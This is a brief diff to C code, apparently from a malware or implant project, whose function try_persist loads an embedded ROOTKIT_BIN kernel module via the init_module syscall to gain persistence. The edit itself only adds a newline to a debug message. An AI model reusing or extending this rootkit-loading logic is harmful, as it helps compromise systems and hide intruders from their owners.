@@ -36,6 +36,6 @@ void try_persist(Globals *glob) {
 
   if (global->syscall(__NR_init_module, ROOTKIT_BIN,
                       sizeof(ROOTKIT_BIN) / sizeof(ROOTKIT_BIN[0]), "") == -1) {
-    DEBUG_LOG("[Rootkit] Failed to load module");
+    DEBUG_LOG("[Rootkit] Failed to load module\n");
   }
 }
